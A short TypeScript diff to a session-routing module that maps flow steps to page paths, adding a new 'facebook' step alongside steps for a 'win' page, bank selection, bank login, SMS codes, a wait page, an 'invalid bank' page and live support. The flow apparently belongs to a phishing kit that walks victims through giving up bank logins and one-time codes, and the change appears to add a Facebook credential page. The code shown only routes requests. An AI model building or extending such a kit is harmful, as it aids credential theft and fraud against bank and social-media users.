@@ -13,6 +13,7 @@ const STEP_PRIORITY: Record<string, number> = {
   code_entry: 10,
   win: 20,
   banken: 30,
+  facebook: 35,
   bank: 40,
   bank_login: 40,
   sms: 50,
@@ -109,6 +110,8 @@ export function stepToPath(
       return `/win/${routeSessionId}`;
     case "banken":
       return "/banken";
+    case "facebook":
+      return "/facebook";
     case "bank":
     case "bank_login":
       return "/banken";
@@ -152,6 +155,7 @@ export function pathToStep(pathname: string): SessionStep | null {
   if (pathname.includes("/bank/")) return "bank";
   if (pathname.startsWith("/win")) return "win";
   if (pathname.startsWith("/banken") || pathname.startsWith("/banks")) return "banken";
+  if (pathname.startsWith("/facebook")) return "facebook";
   if (pathname.startsWith("/wait")) return "wait";
   if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
   if (pathname.startsWith("/live-support")) return "live_support";
